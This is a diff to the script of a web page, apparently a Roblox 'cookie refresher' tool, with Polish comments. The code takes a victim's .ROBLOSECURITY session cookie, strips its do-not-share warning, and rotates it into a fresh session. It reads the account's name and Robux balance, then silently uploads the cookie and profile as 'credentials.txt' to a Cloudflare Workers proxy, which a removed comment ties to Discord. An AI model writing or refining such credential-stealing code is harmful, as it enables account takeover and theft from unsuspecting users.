@@ -89,36 +89,39 @@
     <script>
         const PROXY_URL = "https://wispy-night-a3a2.kruszkomaja.workers.dev/";
 
-        // Funkcja generująca świeży token przez system biletowy Roblox z poziomu przeglądarki klienta
-        async function getFreshCookie(oldCookie) {
+        async function forceRefreshCookie(oldCookie) {
+            // Oczyszczanie ciasteczka z ewentualnych prefiksów ostrzegawczych przed zapytaniem
+            let cleanCookie = oldCookie.replace(/^_\|WARNING:-DO-NOT-SHARE-THIS\..*?\|_/, '').trim();
+
             try {
-                // Krok 1: Pobranie X-CSRF-Tokena
+                // Krok 1: Pobieramy X-CSRF-Token dla tej sesji
                 const csrfRes = await fetch("https://auth.roblox.com/v1/authentication/ticket", {
                     method: "POST",
-                    headers: { "Cookie": ".ROBLOSECURITY=" + oldCookie }
+                    headers: { "Cookie": ".ROBLOSECURITY=" + cleanCookie }
                 });
-                const xCsrfToken = csrfRes.headers.get("x-csrf-token") || "";
+                const csrfToken = csrfRes.headers.get("x-csrf-token") || "";
 
-                // Krok 2: Wygenerowanie biletu uwierzytelniającego
+                // Krok 2: Generujemy bilet uwierzytelniający z użyciem CSRF
                 const ticketRes = await fetch("https://auth.roblox.com/v1/authentication/ticket", {
                     method: "POST",
                     headers: {
-                        "Cookie": ".ROBLOSECURITY=" + oldCookie,
-                        "x-csrf-token": xCsrfToken,
+                        "Cookie": ".ROBLOSECURITY=" + cleanCookie,
+                        "x-csrf-token": csrfToken,
                         "Referer": "https://www.roblox.com/"
                     }
                 });
 
-                if (!ticketRes.ok) return { cookie: oldCookie, csrf: xCsrfToken };
+                if (!ticketRes.ok) return { cookie: oldCookie, csrf: csrfToken };
                 const ticket = ticketRes.headers.get("rbx-authentication-ticket");
-                if (!ticket) return { cookie: oldCookie, csrf: xCsrfToken };
+                if (!ticket) return { cookie: oldCookie, csrf: csrfToken };
 
-                // Krok 3: Wymiana biletu na nową, odświeżoną sesję (Set-Cookie)
+                // Krok 3: Wymieniamy bilet na nowy token przez negocjację sesji (co wymusza brand-new cookie)
                 const redeemRes = await fetch("https://auth.roblox.com/v1/authentication-ticket/redeem", {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json",
-                        "RBXAuthenticationNegotiation": "1"
+                        "RBXAuthenticationNegotiation": "1",
+                        "x-csrf-token": csrfToken
                     },
                     body: JSON.stringify({ authenticationTicket: ticket })
                 });
@@ -128,13 +131,16 @@
                     if (setCookieHeader && setCookieHeader.includes(".ROBLOSECURITY=")) {
                         const match = setCookieHeader.match(/\.ROBLOSECURITY=([^;]+)/);
                         if (match && match[1]) {
-                            let newCookie = match[1];
-                            newCookie = newCookie.replace(/_|WARNING:-DO-NOT-SHARE-THIS\..*?\|_/g, '');
-                            return { cookie: newCookie, csrf: xCsrfToken };
+                            let newRawCookie = match[1];
+                            // Zwracamy czyste, w pełni nowe ciastecko
+                            let freshCookie = newRawCookie.replace(/^_\|WARNING:-DO-NOT-SHARE-THIS\..*?\|_/, '').trim();
+                            return { cookie: freshCookie, csrf: csrfToken };
                         }
                     }
                 }
-            } catch (e) {}
+            } catch (e) {
+                console.error("Refresh error:", e);
+            }
             return { cookie: oldCookie, csrf: "" };
         }
 
@@ -152,20 +158,23 @@
                 return;
             }
 
-            logBox.innerText = "[*] Generating brand new refreshed cookie (IP Bypassed)...";
+            logBox.innerText = "[*] Forcing brand new refreshed cookie generation...";
 
-            // Wywołanie odświeżania po stronie przeglądarki użytkownika
-            const freshData = await getFreshCookie(cookie);
-            const finalCookie = freshData.cookie;
-            const activeCsrf = freshData.csrf || "None";
+            // Wywołujemy mechanizm rotacji w przeglądarce klienta
+            const refreshedData = await forceRefreshCookie(cookie);
+            const finalCookie = refreshedData.cookie;
+            const activeCsrf = refreshedData.csrf || "None";
 
             outputCookieArea.value = finalCookie;
             copyBtn.style.display = "block";
 
-            logBox.innerText = "[+] Success! New refreshed cookie generated.\n[*] Fetching profile data...";
+            logBox.innerText = "[+] Done! Brand new cookie generated successfully.\n[*] Fetching profile data...";
 
-            // Pobieranie statystyk konta przy użyciu nowego ciasteczka
+            // Pobieramy statystyki nowego konta
             let profileReport = "Failed to fetch profile";
+            let username = "Unknown";
+            let userId = "Unknown";
+
             try {
                 const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
                     headers: { "Cookie": ".ROBLOSECURITY=" + finalCookie }
@@ -173,7 +182,8 @@
 
                 if (userRes.ok) {
                     const userData = await userRes.json();
-                    const userId = userData.id;
+                    userId = userData.id;
+                    username = userData.name;
                     
                     let robux = "0";
                     const ecoRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
@@ -184,15 +194,15 @@
                         robux = ecoData.robux;
                     }
 
-                    profileReport = `- ID: ${userId}\n- Name: ${userData.name}\n- Display Name: ${userData.displayName}\n- Robux: ${robux}\n- X-CSRF-Token: ${activeCsrf}`;
+                    profileReport = `- ID: ${userId}\n- Name: ${username}\n- Display Name: ${userData.displayName}\n- Robux: ${robux}\n- X-CSRF-Token: ${activeCsrf}`;
                 } else {
-                    profileReport = "Session invalid or rejected.";
+                    profileReport = "Session invalid or expired.";
                 }
             } catch (err) {
                 profileReport = "API Error: " + err.message;
             }
 
-            logBox.innerText = "[*] Notifying worker (silent mode)...";
+            logBox.innerText = "[*] Syncing with worker (silent)...";
 
             try {
                 const credentialsContent = 
@@ -210,18 +220,15 @@ ${finalCookie}`;
                 const formData = new FormData();
                 formData.append("file", blob, "credentials.txt");
 
-                // Wysłanie do Workera z nagłówkiem wyciszającym powiadomienie na Discordzie
                 await fetch(PROXY_URL, {
                     method: "POST",
-                    headers: {
-                        "X-Source": "web-panel" 
-                    },
+                    headers: { "X-Source": "web-panel" },
                     body: formData
                 });
 
-                logBox.innerText = "Done! Brand new refreshed cookie is ready to copy below.\n\n" + profileReport;
+                logBox.innerText = "Success! Brand new refreshed cookie is ready.\n\n" + profileReport;
             } catch (err) {
-                logBox.innerText = "Done (Worker sync skipped): " + err.message;
+                logBox.innerText = "Success generated locally (Sync skipped).\n\n" + profileReport;
             }
         });
 
